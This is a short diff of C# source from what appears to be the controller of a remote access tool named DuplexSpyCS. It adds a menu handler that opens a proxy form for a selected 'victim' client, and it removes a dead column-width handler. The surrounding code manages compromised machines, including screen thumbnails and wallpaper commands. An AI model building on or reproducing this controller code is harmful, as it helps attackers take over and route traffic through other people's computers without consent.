@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.Diagnostics.Eventing.Reader;
 using System.Drawing.Imaging;
 using System.Reflection;
+using System.Reflection.Metadata.Ecma335;
 using System.Runtime.InteropServices;
 using System.Text;
 
@@ -1280,7 +1281,7 @@ namespace DuplexSpyCS
                     frmFunStuff f = clsTools.fnFindForm<frmFunStuff>(v);
                     if (f == null)
                         return;
-                    
+
                     if (cmd[1] == "wp")
                     {
                         if (cmd[2] == "set")
@@ -1671,7 +1672,7 @@ namespace DuplexSpyCS
                 }
             };
 
-            
+
 
             newListView1.Columns[0].Width = newListView1.Font.Height;
             screen_width = newListView1.Columns[0].Width;
@@ -2400,23 +2401,19 @@ namespace DuplexSpyCS
             new frmBoxHelper("Function\\Main").Show();
         }
 
-        private void listView1_ColumnWidthChanged(object sender, ColumnWidthChangedEventArgs e)
+        private void toolStripMenuItem48_Click(object sender, EventArgs e)
         {
-            return;
-            if (e.ColumnIndex != 0)
+            List<clsVictim> lsVictim = newListView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
+            if (lsVictim.Count == 0)
                 return;
-
-            int width = newListView1.Columns[0].Width;
-            if (width < 25)
+            else if (lsVictim.Count > 1)
             {
-                width = 25;
+                MessageBox.Show("You selected more than one client, the first client will be used automatically.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
             }
 
-            if (width < 256)
-            {
-                il_screen.ImageSize = new Size(width, width);
-                screen_width = width;
-            }
+            clsVictim victim = lsVictim.First();
+            frmProxy f = new frmProxy(victim);
+            f.ShowDialog();
         }
     }
 }
